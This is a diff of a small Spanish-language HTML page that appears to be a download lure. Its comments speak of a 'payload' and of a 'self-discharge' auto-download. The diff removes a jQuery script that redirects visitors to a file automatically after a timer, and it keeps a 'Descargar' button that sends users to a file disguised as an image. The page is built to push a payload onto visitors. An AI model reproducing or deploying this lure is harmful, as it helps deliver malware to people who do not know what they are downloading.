@@ -23,21 +23,10 @@
 </style>	
 <title></title>
 <script src="http://code.jquery.com/jquery-3.2.1.min.js"></script>
-<script>
-$(function() {
-$('a[data-auto-download]').each(function(){
-var $this = $(this);
-setTimeout(function() {
-window.location = $this.attr('href');
-}, 999999999999999999999); <!-- change to 200 for self-discharge(data-auto-download) -->
-});
-});
-</script>
 </head>
 <body>
 <div class="wrapper">
-<!-- DEFINE FILE TO SEND  DATA-AUTO-DOWNLOAD href="payload"; ONECLICK="payload" -->
-<a data-auto-download href="Image/Fnew.png" ></a>
+<!-- DEFINE FILE TO SEND  ONECLICK="PAYLOAD GENERATE" -->
 <center>
 <input type="submit" class="btn" style="width:20%" class="fa fa-download" class="BotonDown" value="Descargar" onclick="document.location.href='Image/Fnew.png'">
 </center>
@@ -45,4 +34,3 @@ window.location = $this.attr('href');
 </div>
 </body>
 </html>
-
